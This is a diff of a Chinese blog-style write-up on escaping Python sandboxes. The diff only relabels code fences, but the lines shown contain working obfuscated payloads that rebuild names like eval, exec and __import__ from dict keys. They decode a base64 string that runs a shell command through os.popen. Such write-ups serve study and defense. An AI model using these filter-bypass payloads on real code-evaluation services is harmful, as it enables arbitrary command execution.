@@ -209,7 +209,7 @@ exec(
 
 好在思路有了，只需要换一下库就行。`dict` 参数要求是合法的变量名，那么我们很容易想到 base64 里的字符大部分都是 `0-9a-zA-Z` 构成，还有特殊的字符 `=`、`/`、`+`。后面我们会挨个解决这三个字符的问题，先展示下 payload：
 
-```
+```python
 [eval][
     bool(
         exec(
@@ -241,7 +241,7 @@ exec(
 
 更进一步，这个 payload 里除了 `eval`、`list`、`dict`、`for`、`in`、`数字` 之外其他常量/函数/关键字都不是必要的。都可以用 `eval` + `list` + `dict` 构造。所以这个 payload 可以变成这样：
 
-```
+```python
 CMD = [eval][eval(list(dict(b_o_o_l=1))[0][::2])(eval(list(dict(e_x_e_c=1))[0][::2])(eval(list(dict(b_y_t_e_s=1))[0][::2])([eval(list(dict(o_r_d=1))[0][::2])(j)for(i)in(list(eval(list(dict(o_p_e_n=1))[0][::2])(eval(list(dict(s_t_r=1))[0][::2])(eval(list(dict(_1_1i1m1p1o1r1t1_1_=1))[0][::2])(list(dict(b_a_s_e_6_4=1))[0][::2]))[23:-2])))[:-5]for(j)in(i)])))](eval(list(dict(b_6_4_d_e_c_o_d_e=1))[0][::2])(list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=1))[0]))
 ```
 
@@ -275,7 +275,7 @@ CMD = [eval][eval(list(dict(b_o_o_l=1))[0][::2])(eval(list(dict(e_x_e_c=1))[0][:
 
 再经过一番探索，我发现 `vars()` 真是完美。它有一个可选参数，当没指定参数的时候，与 `locals()` 结果一致。当指定参数的时候，会获取参数所在命名空间的 `locals()`。所以我们可以先 `import binascii` ，在利用 `vars(binascii)` 取出里面的 `a2b_base64` 从而进行 base64 解码：
 
-```
+```python
 eval(vars(eval(list(dict(_1_1i1m1p1o1r1t1_1_=1))[0][::2])(list(dict(b_i_n_a_s_c_i_i_=1))[0][::2]))[list(dict(a_2_b1_1b_a_s_e_6_4=1))[0][::2]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=1))[0]))
 ```
 
